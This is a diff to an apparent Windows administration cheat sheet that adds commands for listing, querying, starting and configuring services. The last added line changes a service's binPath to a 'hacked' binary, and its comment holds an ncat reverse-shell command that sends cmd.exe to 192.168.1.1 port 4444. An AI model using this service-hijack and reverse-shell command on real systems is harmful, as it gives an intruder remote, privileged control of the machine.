@@ -122,7 +122,17 @@ netsh advfirewall add rule ?
 ```
 sc start WSearch
 
-tasklist
+tasklist /svc # list all services
+sc query someservice # query one
+sc qc someservice
+PsService.exe query WSearch
+PsService.exe config WSearch
+net stop WSearch
+net start WSearch
+sc config WSearch start=auto
+psservice config WSearch
 
+psservice setconfig someservice auto
+sc config someservice binPath="c:\hacked\binary.exe" # "ncat.exe 192.168.1.1 4444 -e cmd.exe"
 ```
 
